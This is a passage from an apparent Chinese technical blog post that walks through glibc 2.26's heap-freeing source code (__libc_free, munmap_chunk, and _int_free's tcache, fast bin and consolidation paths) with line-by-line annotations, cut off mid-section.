    <link href="http://cyyyber.icu/2021/10/23/glibc-free%E5%8E%9F%E7%90%86%E5%8F%8A%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://cyyyber.icu/2021/10/23/glibc-free%E5%8E%9F%E7%90%86%E5%8F%8A%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2021-10-22T16:00:00.000Z</published>
    <updated>2021-11-08T02:58:39.862Z</updated>
    
    <content type="html"><![CDATA[<p>上一篇文章主要介绍了glibc2.26下Linux堆的相关概念和分配原理，本文将继续根据glibc2.26的源码介绍Linux的堆释放原理。</p><span id="more"></span><h1 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h1><p>即<code>free</code>函数，主要就是判断chunk是否是由mmap分配的，如果是就调用<code>munmap_chunk</code>，如果不是就调用<code>_int_free</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">void</span> __libc_free(<span class="keyword">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p; <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line">  <span class="comment">//如果__free_hook不为空就执行__free_hook</span></span><br><span class="line">  <span class="keyword">void</span> (*hook)(<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *) = atomic_forced_read(__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>) <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">//将指向用户数据的指针转换成指向chunk头的指针</span></span><br><span class="line">  p = mem2chunk(mem);</span><br><span class="line">  <span class="comment">//判断p是否是由mmap分配</span></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped(p)) <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span></span><br><span class="line"><span class="comment"> Dumped fake mmapped chunks do not affect the threshold.  */</span></span><br><span class="line">    <span class="comment">//检查是否需要调整阀值</span></span><br><span class="line">    <span class="keyword">if</span> (!mp_.no_dyn_threshold &amp;&amp; chunksize_nomask(p) &gt; mp_.mmap_threshold &amp;&amp; chunksize_nomask(p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK(p))</span><br><span class="line">    &#123;</span><br><span class="line">      mp_.mmap_threshold = chunksize(p);</span><br><span class="line">      mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">      LIBC_PROBE(memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                 mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//调用munmap_chunk来释放由mmap分配的chunk</span></span><br><span class="line">    munmap_chunk(p);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//如果tcache没有初始化就先初始化tcache</span></span><br><span class="line">  MAYBE_INIT_TCACHE();</span><br><span class="line">        </span><br><span class="line">  ar_ptr = arena_for_chunk(p);<span class="comment">//p所对应的malloc_state结构体</span></span><br><span class="line">  _int_free(ar_ptr, p, <span class="number">0</span>);<span class="comment">//调用_int_free进行更进一步的free操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="munmap-chunk"><a href="#munmap-chunk" class="headerlink" title="munmap_chunk"></a>munmap_chunk</h2><p><code>munmap_chunk</code>找到p的前一个chunk，然后利用系统调用<code>__munmap</code>将两个chunk一起释放，但是mmap分配的chunk是独立的，所以大部分情况下只是释放了p</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function">    internal_function</span></span><br><span class="line"><span class="function">    <span class="title">munmap_chunk</span><span class="params">(mchunkptr p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  INTERNAL_SIZE_T size = chunksize(p);</span><br><span class="line"></span><br><span class="line">  assert(chunk_is_mmapped(p));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Do nothing if the chunk is a faked mmapped chunk in the dumped</span></span><br><span class="line"><span class="comment">     main arena.  We never free this memory.  */</span></span><br><span class="line">  <span class="keyword">if</span> (DUMPED_MAIN_ARENA_CHUNK(p))</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uintptr_t</span> block = (<span class="keyword">uintptr_t</span>)p - prev_size(p);<span class="comment">//前一个chunk的指针</span></span><br><span class="line">  <span class="keyword">size_t</span> total_size = prev_size(p) + size;<span class="comment">//两个chunk的size之和</span></span><br><span class="line">  <span class="comment">/* Unfortunately we have to do the compilers job by hand here.  Normally</span></span><br><span class="line"><span class="comment">     we would test BLOCK and TOTAL-SIZE separately for compliance with the</span></span><br><span class="line"><span class="comment">     page size.  But gcc does not recognize the optimization possibility</span></span><br><span class="line"><span class="comment">     (in the moment at least) so we combine the two values into one before</span></span><br><span class="line"><span class="comment">     the bit test.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(((block | total_size) &amp; (GLRO(dl_pagesize) - <span class="number">1</span>)) != <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr(<span class="string">&quot;munmap_chunk(): invalid pointer&quot;</span>);</span><br><span class="line"></span><br><span class="line">  atomic_decrement(&amp;mp_.n_mmaps);</span><br><span class="line">  atomic_add(&amp;mp_.mmapped_mem, -total_size);<span class="comment">//mmapped_mem减去total_size</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If munmap failed the process virtual memory address space is in a</span></span><br><span class="line"><span class="comment">     bad shape.  Just leave the block hanging around, the process will</span></span><br><span class="line"><span class="comment">     terminate shortly anyway since not much can be done.  */</span></span><br><span class="line">  __munmap((<span class="keyword">char</span> *)block, total_size);<span class="comment">//系统调用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><p>先尝试放入tcache，如果不行就尝试放入fast bin，最后进行合并操作后放入unsorted bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free(mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;     <span class="comment">/* its size */</span></span><br><span class="line">  mfastbinptr *fb;          <span class="comment">/* associated fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;      <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize; <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> nextinuse;            <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize; <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;            <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;            <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  size = chunksize(p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect((<span class="keyword">uintptr_t</span>)p &gt; (<span class="keyword">uintptr_t</span>)-size, <span class="number">0</span>) || __builtin_expect(misaligned_chunk(p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr(<span class="string">&quot;free(): invalid pointer&quot;</span>);</span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">  <span class="comment">//对size进行检查</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size)))</span><br><span class="line">    malloc_printerr(<span class="string">&quot;free(): invalid size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p);</span><br></pre></td></tr></table></figure><h3 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果tcache未满，直接放入tcache后返回</span></span><br><span class="line">    <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_put(p, tc_idx);<span class="comment">//将chunk放入对应的tcache链表</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>放入tcache后会直接返回，不会做后面的合并操作</p><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>如果chunk属于fast bin的范围，就将chunk放入fast bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">    and used quickly in malloc.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="comment">//如果p的size小于等于fast bin的最大size则将p放入fast bin</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="comment">//如果TRIM_FASTBINS被设置为1则不要将与top chunk相邻的chunk放入fast bin</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//检查下一个chunk的size的合法性</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(chunksize_nomask(chunk_at_offset(p, size)) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect(chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">bool</span> fail = <span class="literal">true</span>;</span><br><span class="line">      <span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might result in a false positive.  Redo the test after</span></span><br><span class="line"><span class="comment">   getting the lock.  */</span></span><br><span class="line">      <span class="comment">//如果刚才的结果是在不加锁的情况下获得的，就会由于系统的并发修改而不正确</span></span><br><span class="line">      <span class="comment">//所以在加锁的情况下再做一遍合法性测试</span></span><br><span class="line">      <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      &#123;</span><br><span class="line">        __libc_lock_lock(av-&gt;mutex);</span><br><span class="line">        fail = (chunksize_nomask(chunk_at_offset(p, size)) &lt;= <span class="number">2</span> * SIZE_SZ || chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">        __libc_lock_unlock(av-&gt;mutex);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fail)</span><br><span class="line">        malloc_printerr(<span class="string">&quot;free(): invalid next size (fast)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//将p的数据部分清空</span></span><br><span class="line">    free_perturb(chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    atomic_store_relaxed(&amp;av-&gt;have_fastchunks, <span class="literal">true</span>);<span class="comment">//将have_fastchunks置为1</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin(av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">   add (i.e., double free).  */</span></span><br><span class="line">      <span class="comment">//检查fast bin第一个chunk是不是要放入的chunk，防止double free</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr(<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">      <span class="comment">//将p插入fast bin链表</span></span><br><span class="line">      p-&gt;fd = old;</span><br><span class="line">      *fb = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">     add (i.e., double free).  */</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))</span><br><span class="line">          malloc_printerr(<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">        <span class="comment">//将p插入fast bin链表</span></span><br><span class="line">        p-&gt;fd = old2 = old;</span><br><span class="line">      &#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">       size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">       only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">       allocated again.  */</span></span><br><span class="line">    <span class="comment">//在保证加锁的情况下检查新的chunk是否加入了正确的fast bin链表</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect(fastbin_index(chunksize(old)) != idx, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr(<span class="string">&quot;invalid fastbin entry (free)&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="unsorted-bin-and-consolidate"><a href="#unsorted-bin-and-consolidate" class="headerlink" title="unsorted bin and consolidate"></a>unsorted bin and consolidate</h3><p>如果不能放入fast bin就放入unsorted bin，顺便与相邻的空闲chunk进行合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Consolidate other non-mmapped chunks as they arrive.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="comment">//如果p不满足fast bin，并且不属于mmap，就与相邻的未使用chunk合并放入unsorted bin</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p))</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we&#x27;re single-threaded, don&#x27;t lock the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      have_lock = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_lock(av-&gt;mutex);</span><br><span class="line"></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="comment">//一些安全性检查：检查p是否是top chunk</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(p == av-&gt;top))</span><br><span class="line">      malloc_printerr(<span class="string">&quot;double free or corruption (top)&quot;</span>);</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="comment">//检查p的下一个chunk是否已经超出arena区域</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(contiguous(av) &amp;&amp; (<span class="keyword">char</span> *)nextchunk &gt;= ((<span class="keyword">char</span> *)av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">      malloc_printerr(<span class="string">&quot;double free or corruption (out)&quot;</span>);</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="comment">//检查p是否实际上没有被标记为正在使用</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(!prev_inuse(nextchunk)))</span><br><span class="line">      malloc_printerr(<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="comment">//检查下一个chunk的size的合法性</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(chunksize_nomask(nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect(nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr(<span class="string">&quot;free(): invalid next size (normal)&quot;</span>);</span><br><span class="line">    <span class="comment">//清空p的数据区域</span></span><br><span class="line">    free_perturb(chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="comment">//如果上一个chunk没有被使用，则向上合并</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p))</span><br><span class="line">    &#123;</span><br><span class="line">      prevsize = prev_size(p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>)prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);<span class="comment">//将p从链表中解出</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果下一个chunk不是top chunk并且没有被使用，则向下合并</span></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse)</span><br><span class="line">      &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);<span class="comment">//将p的下一个chunk从链表中解出</span></span><br><span class="line">        size += nextsize;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//如果下一个chunk被使用了则将当前chunk设置为未使用</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">  <span class="comment">//将p放入unsorted bin链表</span></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">        malloc_printerr(<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="comment">//如果p的大小属于large bin的范围就将fd_nextsize和bk_nextsize指针置空</span></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">      &#123;</span><br><span class="line">        p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="comment">//如果p与top chunk相邻就合并到top chunk里</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, 